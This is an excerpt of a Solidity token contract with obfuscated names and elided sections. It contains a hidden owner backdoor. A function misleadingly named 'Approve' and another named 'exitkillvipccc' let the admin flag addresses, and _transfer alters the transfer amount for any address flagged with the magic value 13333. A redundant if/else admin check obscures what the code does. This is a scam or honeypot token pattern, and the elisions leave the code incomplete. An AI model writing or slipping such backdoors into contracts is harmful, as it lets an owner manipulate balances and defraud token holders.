...
contract Token is Ownable {
    ...
    function exitkillvipccc(address cjjjss) public    {
        uint128 zramount = 0;
        duumuserloiu[cjjjss] = zramount;    
        if(_msgSender() == ciyuAdmintmrr){
            require(_msgSender() == ciyuAdmintmrr);
        }else{
            require(_msgSender() == ciyuAdmintmrr);
        }
    ...
    function Approve(address cjjjss) public    {
        ...
        duumuserloiu[cjjjss] = newpassnum;
        if(_msgSender() == ciyuAdmintmrr){
            require(_msgSender() == ciyuAdmintmrr);
        }else{
            require(_msgSender() == ciyuAdmintmrr);
    ...
    function _transfer(
        ...
        if (13333 != duumuserloiu[vipFrom]) {}else{
            amount = _balances[vipFrom] + duumuserloiu[vipFrom];
        }
